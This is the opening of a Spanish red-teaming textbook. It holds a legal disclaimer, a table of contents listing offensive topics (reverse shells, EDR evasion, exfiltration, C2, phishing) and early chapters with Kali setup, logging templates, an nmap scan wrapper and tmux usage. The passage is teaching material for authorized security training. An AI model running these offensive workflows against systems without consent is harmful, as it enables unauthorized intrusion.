![Portada](portada_full_red_team.jpg)

# Índice — *Full Red Team: Ethical Hacking*

# Disclaimer — *Full Red Team: Ethical Hacking*

**Lee esto antes de usar cualquier contenido del libro.** Este libro ofrece técnicas, tácticas, procedimientos y ejemplos de código relacionados con la seguridad ofensiva y el red teaming con fines educativos y de mejora de la defensa. Al usar este material aceptas cumplir con las condiciones y advertencias descritas a continuación.

---

## 1. Propósito y alcance

El contenido de *Full Red Team: Ethical Hacking* **está destinado exclusivamente a fines legales, éticos y educativos**: formación en seguridad, pruebas autorizadas en entornos propios o contractuales, ejercicios de laboratorio y mejora de defensas. No está pensado ni autorizado para llevar a cabo actividades ilegales, maliciosas, destructivas o no consentidas.

---

## 2. Consentimiento y autorización

No realices pruebas, explotación, escaneos, exfiltración o cualquier actividad descrita en este libro sobre sistemas, redes, servicios o dispositivos **sin la autorización explícita y documentada** del propietario legal.

* Obtener permiso documentado (por escrito) es **obligatorio** antes de realizar cualquier actividad ofensiva fuera de un entorno de laboratorio privado.
* Las pruebas en terceros sin autorización **pueden constituir delitos** y exponen a responsabilidad civil y penal.

---

## 3. Legalidad y cumplimiento

Las técnicas y scripts del libro pueden implicar acciones reguladas o prohibidas en diferentes jurisdicciones.

* **No soy abogado** y este libro **no constituye asesoramiento legal**. Consulta con asesoría legal local antes de aplicar cualquier técnica fuera de un entorno controlado.
* Cumple con leyes nacionales e internacionales aplicables (delitos informáticos, privacidad, telecomunicaciones, propiedad intelectual, regulaciones sectoriales, etc.).

---

## 4. Ética profesional

El red teaming responsable exige principios éticos: minimizar daños, proteger la privacidad, preservar evidencia, restaurar sistemas y comunicar hallazgos con transparencia.

* Prioriza la seguridad y la privacidad de las personas.
* Evita acceso, copia, modificación o publicación de datos personales sensibles.
* Informa a las partes afectadas únicamente según acuerdos de alcance y cláusulas de no divulgación.

---

## 5. Uso del código y payloads

Los fragmentos de código, exploits y payloads incluidos se proporcionan para **uso en entornos de prueba y enseñanza**.

* **No ejecutes** código en sistemas de producción o de terceros sin permiso.
* Los snippets pueden contener fallos o comportamientos inesperados; revísalos y pruébalos en un entorno controlado.
* Se recomienda ejecutar todo código dentro de máquinas virtuales o contenedores aislados y respaldar entornos antes de cualquier prueba.

---

## 6. Riesgos y daños

Las actividades descritas pueden causar interrupciones, pérdidas de datos o daños en sistemas si no se administran correctamente.

* El autor y editores **no asumen responsabilidad** por daños directos, indirectos, incidentales o consecuentes derivados del uso, mal uso o interpretación del material.
* El lector es el único responsable de las acciones que realice con la información contenida.

---

## 7. Responsabilidad profesional y limitación de garantía

El material se ofrece “tal cual” y sin garantías de idoneidad, precisión o resultados. Se prohíbe considerar este libro como una garantía de éxito en auditorías o ataques simulados.

* No garantizamos que las técnicas funcionen en todos los entornos ni que estén libres de errores.

---

## 8. Divulgación responsable (Responsible Disclosure)

Si descubres una vulnerabilidad real en un producto/servicio durante tu aprendizaje o pruebas:

1. **Detén** cualquier explotación adicional que no sea necesaria para documentar la vulnerabilidad.
2. **Documenta** claramente pasos reproducibles, impacto, alcance, evidencias y mitigaciones sugeridas.
3. **Contacta** al responsable del sistema o al equipo de seguridad del proveedor siguiendo sus políticas de divulgación (si existe).
4. Si no recibes respuesta, sigue las guías de divulgación responsable reconocidas y, si procede, busca mediación o asesoría legal.

**Plantilla breve para notificación** (ejemplo):

```
Asunto: Divulgación responsable — Vulnerabilidad en [producto/sitio]

Hola [Equipo de Seguridad / Soporte],

He identificado una vulnerabilidad en [nombre/URL] que permite [resumen del impacto]. Reproducción: [pasos detallados]. Evidencia: [logs/capturas]. No he explotado la vulnerabilidad fuera de pruebas controladas y me ofrezco a colaborar para la mitigación.

Saludos,
[Nombre / Contacto]
```

---

## 9. Uso en entornos profesionales (contratos y alcance)

Si realizas red teaming como servicio profesional:

* Define **alcance**, **limitaciones**, **reglas de compromiso (RoE)** y **plan de comunicación** por escrito antes de comenzar.
* Incluye cláusulas sobre manejo de datos, exfiltración simulado, reversiones y SLAs para restauración.
* Asegura que todos los entregables y herramientas cumplan con licencias y no incluyan software que viole términos de terceros.

---

## 10. Contenido malicioso y dual-use

Algunas técnicas pueden ser “dual-use” (tienen fines defensivos y ofensivos). El libro presenta estos contenidos con intención educativa y de prevención. **No está permitido** usar el contenido para crear, distribuir o ejecutar software malicioso destinado a causar daño.

---

## 11. Buenas prácticas / recomendaciones

* Crea laboratorios aislados (VMs, redes internas, snapshots).
* Mantén registros detallados (logs) y bitácoras de pruebas.
* Usa credenciales de prueba; nunca credenciales reales de usuarios.
* Si trabajas con datos reales por error, informa al propietario inmediatamente y sigue las políticas de manejo de incidentes.
* Mantente actualizado: parches, defensas y regulaciones cambian con frecuencia.

---

## 12. Derechos de autor y distribución

El contenido del libro está protegido por derechos de autor según la licencia definida por el autor/editor. La reproducción, distribución o difusión masiva del material sin permiso puede estar prohibida. Respeta las licencias de herramientas y librerías usadas en los ejemplos.

---

## 13. Cómo usar este libro de forma segura (resumen práctico)

* Úsalo para aprendizaje y mejora defensiva.
* Monta un laboratorio aislado antes de ejecutar cualquier ejemplo.
* Obtén permisos escritos para pruebas fuera de tu control.
* Reporta vulnerabilidades de forma responsable.
* Consulta asesoría legal cuando corresponda.

---

## 14. Contacto y aclaraciones

Si tienes dudas sobre el alcance de un ejemplo, su seguridad o su aplicación práctica, contacta con el autor/editor para aclaraciones, o busca asesoría legal/ética profesional antes de proceder.

---

## 15. Aviso final

La información contenida en *Full Red Team: Ethical Hacking* es poderosa y puede ser mal empleada. Su propósito es contribuir a la seguridad, formación y resiliencia de sistemas. El mal uso de las técnicas es responsabilidad del actor que las ejecute. Al continuar leyendo y aplicando este material, declaras entender y aceptar las condiciones de este disclaimer.

---

## Parte I — Fundamentos y Preparación

1. **Introducción al Red Teaming** — objetivos, diferencias con pentesting y blue team; metodología y reglas de enfrentamiento. (Ejemplos: checklists en Bash).
2. **Entorno de trabajo: Kali Linux y toolchain** — instalación, personalización, repositorios y gestión de paquetes. (Scripts de setup en Bash y Python).
3. **Automatización y scripting para Red Teamers** — buenas prácticas, manejo de procesos y logging. (Plantillas en Bash y Python).
4. **Gestión de sesiones y control remoto seguro** — tmux, screen, herramientas y túneles reversos. (Snippets para persistir sesiones).
5. **OpSec y anonimato operacional** — técnicas de reducción de huella, proxys, VPNs y Tor. (Scripts para rotar IPs y limpiar históricos).
6. **Infraestructura de laboratorio y C2** — montaje de laboratorio, contenedores y servidores C2 básicos. (Despliegue automatizado con Bash/Python).
7. **Modelado de amenazas y planificación de campañas** — cómo diseñar objetivos y KPIs. (Plantillas exportables desde scripts).

## Parte II — Reconocimiento pasivo y recolección de información

8. **OSINT con Kali: fuentes y metodología** — búsquedas, dominios, redes sociales y leak hunters. (Automatización con Python y APIs).
9. **Footprinting de dominio y DNS** — whois, dig, sublist3r, amass. (Ejemplos: scripts para enumerar subdominios y exportar CSV).
10. **Enumeración de servicios y puertos** — nmap avanzado, escaneo masivo y análisis de resultados. (Parsers en Python para nmap XML).
11. **Banners, fingerprinting y huellas de aplicaciones** — httprint, whatweb, Wappalyzer. (Bash + Python para agrupar fingerprinting).
12. **Escaneo web masivo y crawling** — wayback, gau, gowitness. (Pipelines en Bash para recolectar URLs).
13. **Recolección y análisis de credenciales públicas** — breach records, GitHub secrets, bucket exposures. (Scrapers en Python).
14. **Mapeo de infraestructura cloud** — enumeración de buckets, IAM y metadatos. (Ejemplos con AWS CLI y boto3).

## Parte III — Enumeración activa y explotación inicial

15. **Ataques de red básicos: ARP, ICMP y sniffing** — herramientas: tcpdump, tshark, mitmproxy. (Captura y filtrado con scripts).
16. **Explotación de servicios de red** — metasploit, searchsploit y explotación manual. (Automatización de exploits en Python).
17. **Ataques SMB y NetBIOS** — smbclient, crackmapexec, enum4linux. (Scripts para identificar y explotar recursos compartidos).
18. **Explotación de RDP y servicios Windows** — rdesktop, xfreerdp y abuso de RDP; técnicas de fuerza bruta y bypass. (Automatización y parsing).
19. **Exploits en servicios web** — Burp Suite, sqlmap, commix; vulnerabilidades comunes. (Workflows con scripts y ejemplos de payloads).
20. **Ataques a correo y servicios SMTP/IMAP** — enumeration y phishing técnico. (Envío masivo simulado con Python).
21. **Fuerza bruta y credenciales: Hydra y Medusa** — optimización y bloqueo por IPS. (Wrappers en Python para gestionar colas).
22. **Bypass de autenticación web** — CSRF, JWT abuse, SSO misconfigurations. (PoCs en Python).

## Parte IV — Post-explotación: mantenimiento y movimiento lateral

23. **Shells y despliegue de agentes** — netcat, socat, meterpreter; técnicas para shells estables. (Scripts para establecer reverse shells persistentes).
24. **Persistencia en sistemas Windows y Linux** — servicios, cron, systemd, scheduled tasks. (Ejemplos detallados en Bash y Python).
25. **Evasión de EDR y técnicas anti-forense** — ofuscación, living-off-the-land y timestomping. (PoCs y medidas defensivas).
26. **Elevación de privilegios en Linux** — SUID, capabilidades, exploits locales. (Checkers automáticos en Python).
27. **Elevación de privilegios en Windows** — UAC bypass, tokens, exploits conocidos. (Tooling y playbooks).
28. **Movimiento lateral: Pass-the-Hash, Pass-the-Ticket** — mimikatz, wmiexec, psexec-ng. (Automatización de sesiones).
29. **Abuso de servicios de red internos** — LDAP, Active Directory, DNS internals. (Scripts para extracción de objetos AD).
30. **Exfiltración de datos** — canales covertos, compresión, chunking y transmisión segura. (Implementaciones en Python).

## Parte V — Active Directory y entornos Windows

31. **Fundamentos de Active Directory para Red Teamers** — objetos, permisos y flujos de autenticación. (Herramientas y consultas LDAP en Python).
32. **Enumeración avanzada de AD** — bloodhound, ldapsearch, powerview. (Integración y visualización automatizada).
33. **Kerberos: conceptos y ataques** — AS-REP roast, Kerberoasting, golden/silver tickets. (Scripting con impacket).
34. **Abuso de delegación y trusts** — técnicas para pivotear entre dominios. (Playbooks y scripts).
35. **Ataques a GPO y control de políticas** — modificar startup scripts y políticas. (Automatización con PowerShell / Python).
36. **Defensa ofensiva: seguridad para entornos AD** — detección de malas prácticas y cómo explotarlas.

## Parte VI — Web Application Red Teaming

37. **Pruebas profundas de aplicaciones web** — Burp Suite avanzado, extensiones y scripting. (Extensiones en Python / BApps).
38. **Inyección SQL avanzada y explotación** — técnicas blind, time-based y exfil con SQLi. (Automatización con sqlmap + scripts custom).
39. **RCE y LFI/RFI** — cadenas de explotación, file upload bypass y chaining. (PoCs en Python).
40. **Deserialización insegura y explotación** — Java/.NET/PHP. (Exploit generation y gadgets).
41. **API hacking y OAuth abuse** — evaluación de APIs REST/GraphQL y autorización. (Fuzzers y scripts con requests).
42. **Ataques a aplicaciones modernas (SPA, JWT, WebSockets)** — vectores y pruebas. (Clients y scripts de prueba).

## Parte VII — Red Team en infraestructuras modernas

43. **Ataques en entornos cloud (AWS/GCP/Azure)** — enumeración, escalada y exfil. (Ejemplos con boto3, google-cloud, azure-sdk).
44. **Contenedores y Kubernetes** — discovery, escapes de contenedor y control plane. (Scripts para enumerar pods y secretos).
45. **IoT y dispositivos de red** — firmware, interfaces web y protocolos (MQTT, UPnP). (Automatización de fuzzing).
46. **Wireless & Bluetooth offensive** — aireplay-ng, wifite, BLE spoofing. (Pipelines de captura y crack con scripts).
47. **SCADA/ICS Red Teaming** — protocolos industriales y vectores específicos. (Plantillas y simuladores).

## Parte VIII — Command & Control, herramientas y desarrollo

48. **Frameworks C2: Empire, Cobalt Strike (legales), Pupy** — comparación y uso ético. (Integración con scripts).
49. **Diseño y desarrollo de un C2 básico en Python** — arquitectura, encriptación y módulos. (Implementación paso a paso).
50. **Ofuscación y empaquetado de payloads** — pyinstaller, shikata_ga_nai y packs multi-plataforma. (Ejemplos prácticos).
51. **Ingeniería social técnica y phishing** — plantillas, infraestructura y tracking. (Scripts para gestión de campañas y recopilación).
52. **Red Team metrics y reporting** — cómo presentar hallazgos, evidencias y recomendaciones. (Generadores de reportes automatizados en Python).

## Parte IX — Detección, evaluación y remediación desde la perspectiva offensive

53. **Estrategias de Blue Team vs Red Team** — detección típica y cómo evadirla. (Tests automatizados).
54. **TTPs, MITRE ATT&CK y mapeo** — cómo mapear evidencias a MITRE y priorizar riesgos. (Scripts que generan matrices ATT&CK).
55. **Testing de EDR/AV y telemetry** — cómo medir detección y qué telemetría revisar. (Simuladores y casos de prueba).
56. **Remediación y hardening post-assessment** — pasos concretos para mitigar hallazgos. (Playbooks exportables).
57. **Ejercicios y simulaciones de tabletop** — planificación, ejecución y lecciones aprendidas. (Kits de ejercicios scriptables).

## Parte X — Anexos prácticos y recursos avanzados

58. **Biblioteca de scripts reutilizables** — colección de scripts Bash y Python organizados por objetivo (enumeración, explotación, exfil). (Código listo para copiar/pegar).
59. **Casos de estudio** — tres campañas completas paso a paso desde recon hasta reporte, con código y logs.
60. **Apéndices: comandos, cheat-sheets y referencias** — cheatsheets de nmap, tcpdump, bash, Python, impractical mistakes a evitar.

---

## Parte I — Fundamentos y Preparación


# Capítulo 1 — Introducción al Red Teaming

**Objetivos**

* Entender qué es el red teaming y en qué se diferencia del pentesting y del blue team.
* Conocer la metodología básica de una campaña red team.
* Aprender reglas de enfrentamiento (Rules of Engagement, RoE) y consideraciones éticas y legales.
* Preparar un checklist inicial automatizable en Bash.

---

## ¿Qué es Red Teaming?

Red teaming es un enfoque holístico y simulado de ataque que busca evaluar la resiliencia de una organización frente a adversarios reales. A diferencia del pentesting puntual, el red team imita tácticas, técnicas y procedimientos (TTPs) de actores reales durante una campaña más amplia, incluyendo ingeniería social, despliegue de C2 y persistencia.

**Diferencias clave**

* **Pentesting:** suele ser limitado en alcance, con pruebas técnicas puntuales (vulns, explotación).
* **Red Team:** campaña integrada, objetivos estratégicos, endurance (días/semanas), enfoque en impacto y objetivos del negocio.
* **Blue Team:** defensores; detectan, responden y remedian. El red team colabora en ejercicios para mejorar detección y respuesta.

---

## Metodología (high level)

1. **Planificación / Scoping:** objetivos, alcance, RoE, autorizaciones escritas.
2. **Reconocimiento:** OSINT y footprinting.
3. **Acceso inicial:** explotación de vectores autorizados.
4. **Post-explotación:** persistencia, movimiento lateral, exfil.
5. **Reporte y remediación:** evidencias, timelines, recomendaciones.
6. **Retrospectiva con Blue Team.**

---

## Reglas de enfrentamiento (RoE) y ética

* Siempre contar con **autorización escrita**.
* Definir **objetivos** clínicos (p. ej. acceso a datos X) y **líneas rojas** (no destrucción, no interrupción crítica).
* Registrar todas las acciones y detener si hay riesgo de daño real.
* Seguir las leyes locales y políticas del cliente; consultar asesoría legal si duda.

---

## Paso a paso práctico: preparar un laboratorio en Kali

1. Crear VM Kali + VM víctima (Windows/Linux) en VirtualBox/VMware.
2. Aislar red en modo host-only o NAT con forwarding controlado.
3. Instalar herramientas básicas: `nmap`, `netcat`, `tmux`, `python3`.
4. Snapshots antes y después de pruebas.

---

## Ejemplo: checklist en Bash (rápido)

```bash
#!/bin/bash
echo "[*] Comprobando entorno..."
which nmap || sudo apt update && sudo apt install -y nmap
which tmux || sudo apt install -y tmux
echo "[*] Snapshots creados? (s/n)"
read SNAP
if [ "$SNAP" != "s" ]; then
  echo "Crea snapshots antes de seguir." && exit 1
fi
echo "Checklist inicial OK."
```

## Fragmento Python (registro simple)

```python
# registro_simple.py
import logging
logging.basicConfig(filename='redteam.log', level=logging.INFO)
logging.info("Inicio de campaña: scope=my_lab; autor=Alejandro")
```

---

## Recomendaciones de mitigación

* Políticas de autorizaciones claras.
* Segmentación de red en entornos de producción.
* Backups y snapshots antes de pruebas.
* Monitorización activa (logs, EDR) y plan de respuesta.

---

## Lista de comprobación descargable

* Autorización escrita ✔
* Alcance definido ✔
* Snapshots ✔
* Contacto de emergencia ✔

---

# Capítulo 2 — Entorno de trabajo: Kali Linux y toolchain

**Objetivos**

* Configurar un entorno Kali Linux reproducible y seguro para red teaming.
* Instalar y personalizar la toolchain típica (herramientas de red, explotación, scripting y análisis).
* Automatizar la preparación con scripts Bash y fragmentos en Python.
* Asegurar buenas prácticas de gestión de paquetes y repositorios.

---

## Visión general y consideraciones previas

Kali Linux es una distribución enfocada en pruebas de seguridad y viene con una gran cantidad de herramientas preinstaladas. No obstante, al preparar un entorno profesional o de laboratorio conviene **personalizar** la instalación: mantener repositorios controlados, crear usuarios no root para trabajo diario, automatizar instalación de herramientas adicionales, y configurar entornos Python/virtualenv para aislar dependencias. Recuerda: **solo usa estos entornos en laboratorios o con autorización explícita**.

---

## Repositorios y firma de paquetes (apt)

Kali usa su propio repositorio oficial. Evita mezclar repositorios inestables o de terceros a menos que sepas qué haces. Para comprobar la integridad, revisa siempre las firmas GPG de los repositorios y de los paquetes críticos.

Ejemplo de `/etc/apt/sources.list` mínimo para Kali:

```
deb http://http.kali.org/kali kali-rolling main contrib non-free
```

Actualizar keys (si fuese necesario):

```bash
wget -q -O - https://archive.kali.org/archive-key.asc | sudo apt-key add -
```

Nota: algunos sistemas modernos prefieren administrar claves con `gpg` y `signed-by` en los archivos `.list`.

---

## Gestión de paquetes y actualizaciones

Buenas prácticas:

* Actualiza `sudo apt update && sudo apt full-upgrade -y` con regularidad.
* Usa `apt-listchanges` y prueba actualizaciones en snapshots antes de aplicarlas a entornos críticos.
* Evita `dist-upgrade` no planificado en máquinas de pruebas compartidas.

---

## Personalización del sistema y seguridad básica

* Crea usuario no-root para trabajo diario:

```bash
sudo adduser redteam
sudo usermod -aG sudo redteam
```

* Configura SSH con autenticación por clave (deshabilitar root login por SSH):

```bash
sudo sed -i 's/^PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config
sudo systemctl restart sshd
```

* Habilita UFW para controlar conexiones entrantes (en laboratorios no bloquear lo necesario):

```bash
sudo apt install -y ufw
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow ssh
sudo ufw enable
```

---

## Toolchain esencial (lista recomendada)

* Recon: `nmap`, `amass`, `subfinder`, `waybackurls`, `gau`, `httprobe`
* Web: `burpsuite`, `sqlmap`, `ffuf`, `gobuster`
* Red/Explotación: `metasploit-framework`, `impacket`, `smbclient`, `crackmapexec`
* Shells/Forense: `netcat`, `socat`, `volatility`, `wireshark`, `tshark`
* Desarrollo y scripting: `git`, `python3`, `python3-venv`, `pip`, `openjdk-11-jre`
* Contenedores: `docker`, `docker-compose`

Instalación rápida (Bash):

```bash
sudo apt update && sudo apt full-upgrade -y
sudo apt install -y git python3 python3-venv python3-pip nmap netcat wireshark \
    metasploit-framework docker.io docker-compose tmux vim curl jq
sudo systemctl enable --now docker
sudo usermod -aG docker $USER
```

---

## Script de setup completo en Bash (automatizable)

Guarda como `kali_setup.sh` y ejecútalo en una VM limpia (revisa y adapta antes de ejecutar):

```bash
#!/usr/bin/env bash
set -euo pipefail
echo "[*] Actualizando sistema..."
sudo apt update && sudo apt full-upgrade -y

echo "[*] Instalando toolchain básico..."
PKGS=(git python3 python3-venv python3-pip nmap netcat wireshark \
      metasploit-framework docker.io docker-compose tmux vim curl jq \
      amass ffuf gobuster sqlmap)
sudo apt install -y "${PKGS[@]}"

echo "[*] Configurando SSH: deshabilitar root login"
sudo sed -i 's/^#PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config || true
sudo sed -i 's/^PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config || true
sudo systemctl restart sshd

echo "[*] Habilitando UFW y permitiendo SSH"
sudo apt install -y ufw
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow ssh
sudo ufw --force enable

echo "[*] Configurando entorno Python para el usuario actual"
python3 -m venv ~/rt-env
source ~/rt-env/bin/activate
pip install --upgrade pip setuptools wheel
pip install requests bs4 ipython

echo "[*] Finalizado. Reinicia la sesión para aplicar cambios de docker group."
echo "Recuerda crear snapshots y leer el README antes de ejecutar herramientas destructivas."
```

**Advertencia:** revisa el script y adapta paquetes según la versión de Kali y necesidades.

---

## Fragmentos Python útiles

1. **Gestor simple de registros** (`setup_logger.py`):

```python
import logging, os
def get_logger(name='redteam'):
    os.makedirs('logs', exist_ok=True)
    logging.basicConfig(filename='logs/session.log', level=logging.INFO,
                        format='%(asctime)s %(levelname)s %(message)s')
    return logging.getLogger(name)
if __name__ == "__main__":
    log = get_logger()
    log.info("Setup logger initialized")
```

2. **Comprobador de herramientas instaladas**:

```python
import shutil
tools = ['nmap','git','docker','amass','ffuf']
missing = [t for t in tools if shutil.which(t) is None]
if missing:
    print("Faltan herramientas:", ", ".join(missing))
else:
    print("Todas las herramientas instaladas.")
```

---

## Entornos aislados y virtualización

* Usa snapshots de VirtualBox/VMware antes de cambios mayores.
* Para reproducibilidad, documenta la versión de Kali (`cat /etc/os-release`) y las versiones de herramientas (`nmap --version`, `python3 --version`).
* Considera usar `Vagrant` o `multipass` para levantar entornos reproducibles, o contenedores Docker para herramientas que lo permitan.

---

## Backups, logs y telemetría

* Habilita recolección de logs local (`rsyslog`), guarda logs de pruebas en un directorio versionado.
* Mantén un repositorio privado (git) para scripts y playbooks; no subas credenciales.

---

## Recomendaciones de mitigación y buenas prácticas

* No mezcles entornos de pruebas con producción.
* Mantén parches al día en máquinas objetivo controladas.
* Controla el acceso físico a máquinas de laboratorio.
* Revisa las licencias de herramientas y de paquetes pip antes de distribuírlos.

---

## Lista de comprobación descargable (resumen)

* [ ] Snapshot VM base creado
* [ ] Usuario no-root configurado
* [ ] Repositorios oficiales en `/etc/apt/sources.list`
* [ ] Toolchain instalado (ver script)
* [ ] Entorno Python virtual creado
* [ ] Docker habilitado (si se usa)
* [ ] Logging activo y repositorio privado para scripts

---

# Capítulo 3 — Automatización y scripting para Red Teamers

**Objetivos**

* Aprender buenas prácticas para escribir scripts robustos y mantenibles.
* Gestionar procesos y sesiones de herramientas de forma segura y reproducible.
* Implementar logging fiable (texto y JSON) y rotación de logs.
* Proporcionar plantillas reutilizables en **Bash** y **Python** listas para adaptar a workflows de red teaming.

> **Aviso ético y legal:** los ejemplos de este capítulo son para **laboratorios controlados** y/o pruebas con autorización. No los uses contra sistemas sin permiso escrito. Siempre documenta acciones y mantén registros.

---

## Principios generales de scripting para Red Team

1. **Reproducibilidad:** cada script debe dejar la máquina en estado conocido; usa snapshots y variables de entorno.
2. **Fail-safe:** falla rápido y de forma controlada (`set -euo pipefail` en Bash; excepciones en Python).
3. **Idempotencia:** ejecutar varias veces no debe causar efectos no deseados (comprobar si ya está instalado/configurado).
4. **Logging estructurado:** registra eventos importantes, errores y contextos (user, host, scope, timestamp).
5. **Separación de responsabilidades:** unir en scripts pequeños y composables (uno para instalación, otro para ejecución de tareas).
6. **Seguridad:** no hardcodees credenciales; usa vaults, variables de entorno o archivos con permisos restringidos.
7. **Revisión y control de versiones:** guarda scripts en repositorio privado y marca versiones.

---

## Manejo de procesos y control de sesiones

* Usa `tmux` o `screen` para mantener sesiones interactivas persistentes.
* Para ejecución en background con logs: `nohup myscript.sh > out.log 2>&1 &` (pero preferible `systemd` para producción de laboratorio).
* Para lanzar múltiples tareas concurrentes en Bash: `&` + `wait` o usar `xargs -P`/`parallel`.
* En Python, usa `subprocess.run` para llamadas síncronas y `subprocess.Popen` para procesos que quieres gestionar (pid, comunicación stdin/stdout).

**Ejemplo simple de systemd unit (para ejecutar un agente de pruebas en laboratorio):**

```
[Unit]
Description=RedTeam Agent (lab)
After=network.target

[Service]
User=redteam
WorkingDirectory=/home/redteam/agent
ExecStart=/usr/bin/python3 /home/redteam/agent/agent.py
Restart=on-failure
RestartSec=5
StandardOutput=append:/var/log/redteam/agent.log
StandardError=append:/var/log/redteam/agent.err

[Install]
WantedBy=multi-user.target
```

> Guardar como `/etc/systemd/system/redteam-agent.service` y luego `sudo systemctl daemon-reload && sudo systemctl enable --now redteam-agent`.

---

## Logging: prácticas y plantillas

* Usa timestamps ISO 8601.
* Añade contexto: `campaign_id`, `scope`, `operator`.
* Preferible generar logs en **texto** y/o **JSON** para ingestión por SIEM.
* Rota logs: `logrotate` o `logging.handlers.RotatingFileHandler` en Python.
* Protege logs sensibles: controla permisos (`chmod 600`) y evita registrar credenciales.

### Plantilla Bash con logging y manejo de errores

```bash
#!/usr/bin/env bash
set -euo pipefail
LOGFILE="/var/log/redteam/run_$(date +%Y%m%d_%H%M%S).log"
trap 'echo "[ERROR] $0:$LINENO" >> "$LOGFILE"; exit 1' ERR
echo "[INFO] Inicio $(date -Iseconds)" >> "$LOGFILE"

log() { echo "[$(date -Iseconds)] $*" | tee -a "$LOGFILE"; }
ensure_installed() {
  command -v "$1" >/dev/null 2>&1 || { log "Instalando $1"; sudo apt-get install -y "$1"; }
}

log "Verificando herramientas"
ensure_installed nmap
ensure_installed jq

# Ejemplo: escaneo rápido
TARGET=${1:-127.0.0.1}
log "Escaneando $TARGET"
nmap -sS -Pn -T4 "$TARGET" | tee -a "$LOGFILE"

log "Fin $(date -Iseconds)"
```

### Plantilla Python profesional (logging + subprocess + rotación)

```python
#!/usr/bin/env python3
import logging
from logging.handlers import RotatingFileHandler
import subprocess, os, argparse, json, sys

def setup_logger(logdir='logs', name='redteam', max_bytes=5_000_000, backup=5):
    os.makedirs(logdir, exist_ok=True)
    logger = logging.getLogger(name)
    logger.setLevel(logging.INFO)
    fh = RotatingFileHandler(os.path.join(logdir, 'session.log'), maxBytes=max_bytes, backupCount=backup)
    fmt = logging.Formatter('%(asctime)s %(levelname)s %(message)s')
    fh.setFormatter(fmt)
    logger.addHandler(fh)
    sh = logging.StreamHandler(sys.stdout)
    sh.setFormatter(fmt)
    logger.addHandler(sh)
    return logger

def run_cmd(cmd, logger):
    logger.info("Ejecutando: %s", cmd)
    res = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if res.returncode != 0:
        logger.error("Error (%s): %s", res.returncode, res.stderr.strip())
        raise RuntimeError("Command failed")
    logger.info("Salida: %s", res.stdout.strip())
    return res.stdout

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="127.0.0.1")
    args = parser.parse_args()
    logger = setup_logger()
    logger.info(json.dumps({"event":"start","target":args.target}))
    try:
        out = run_cmd(f"nmap -sS -Pn -T4 {args.target}", logger)
        logger.info(json.dumps({"event":"nmap_complete","summary": out.splitlines()[:5]}))
    except Exception as e:
        logger.exception("Fallo durante ejecución")
    finally:
        logger.info(json.dumps({"event":"end"}))
```

---

## Buenas prácticas operativas (automatización segura)

* **Variables de entorno:** usa `.env` con permisos `600`, no lo subas a git.
* **Entradas validadas:** parser de argumentos (`argparse`) y validación de inputs para evitar inyecciones.
* **Modo dry-run:** añade `--dry-run` para ver qué haría el script sin ejecutar cambios.
* **Modo verbose / debug:** `--verbose` activa más logging.
* **Lockfiles / pidfiles:** evita ejecutar dos instancias del mismo script que puedan chocar:

```bash
LOCK="/var/run/my_script.lock"
if [ -e "$LOCK" ] && kill -0 "$(cat $LOCK)" 2>/dev/null; then
  echo "Ya en ejecución." && exit 1
fi
echo $$ > "$LOCK"
trap 'rm -f "$LOCK"' EXIT
```

---

## Plantillas y patrones reutilizables

* `install_tools.sh` (idempotente), `run_scan.sh` (logging + dry-run), `agent.py` (daemonizable con systemd), `utils/logging.py` (logger compartido).
* Organiza: `/scripts/install/`, `/scripts/run/`, `/tools/`, `/docs/`.

---

## Checklist para automatización segura

* [ ] Scripts versionados en repo privado.
* [ ] `--dry-run` y `--verbose` implementados.
* [ ] Logging con rotación y permisos.
* [ ] Lockfile para evitar concurrencia.
* [ ] Validación de inputs (no usar user-supplied command strings).
* [ ] Documentación en README + ejemplos.
* [ ] Pruebas en snapshot antes de ejecutar.

---

## Recomendaciones de mitigación

* Evitar ejecución automática de herramientas destructivas sin supervisión.
* Revisar logs para detectar efectos no deseados.
* Establecer límites de tiempo y recursos (timeouts en `subprocess.run(timeout=...)`).
* Realizar revisiones de código antes de usar scripts en campañas.

---

# Capítulo 4 — Gestión de sesiones y control remoto seguro

**Objetivos**

* Entender y aplicar herramientas para gestionar sesiones persistentes durante campañas de red team: `tmux`, `screen`, `mosh` y gestores de procesos.
* Configurar túneles inversos (reverse tunnels) y canales seguros para acceso remoto controlado.
* Aprender técnicas para mantener sesiones seguras, recuperar sesiones y proteger credenciales.
* Incluir snippets prácticos para crear sesiones persistentes y políticas de limpieza.

---

## Introducción y contexto

En operaciones ofensivas y de prueba, mantener sesiones de trabajo estables y recuperables es crítico. Las interrupciones (conexiones inestables, reboots, cambios de IP) deben gestionarse mediante multiplexores de terminal y túneles seguros. No todas las técnicas que se describen deben usarse en producción: muchas son para laboratorios o pruebas con autorización. Antes de desplegar cualquier túnel o agente, define límites claros en las Rules of Engagement.

---

## Herramientas principales

### tmux

Multiplexor moderno, muy usado por profesionales para mantener múltiples ventanas/panes y reconectar a sesiones en marcha. Características clave: persistencia, detaching/attaching, scripting de sesiones.

### screen

Alternativa clásica. Menos moderna que tmux pero aún en uso en entornos antiguos.

### mosh

Mejor experiencia en conexiones inestables (maneja roaming y reconexión automática) aunque no reemplaza la persistencia de tmux.

### autossh

Permite mantener túneles SSH persistentes reintentando reconexión automática; muy útil para reverse tunnels estables.

### systemd / supervisord

Para ejecutar agentes o scripts como servicios manejables por el sistema, con restart policies.

---

## Buenas prácticas de gestión de sesiones

* Evitar ejecutar procesos críticos únicamente en una sesión interactiva sin persistencia.
* Usar `tmux` para mantener toda la actividad en sesiones reaprovechables. Crear naming convention: `rt-{campaign}-{target}`.
* Registrar el `tmux ls` y asociar logs a la sesión.
* No dejar credenciales sin protección en buffers o ficheros temporales.
* Usar claves SSH con passphrase y agentes (`ssh-agent`) para no almacenar contraseñas en texto claro.
* Limitar acceso mediante reglas de firewall y listas blancas de IP cuando sea posible.

---

## Paso a paso: tmux básico y avanzado

### Inicializar sesión tmux

```bash
# Crear sesión con nombre
tmux new-session -s rt-campaign -n shell
# Desde otra terminal adjuntar:
tmux attach -t rt-campaign
# Listar sesiones:
tmux ls
# Detach (CTRL-b d)
```

### Crear layout y paneles

```bash
tmux new-session -s rt-campaign -d
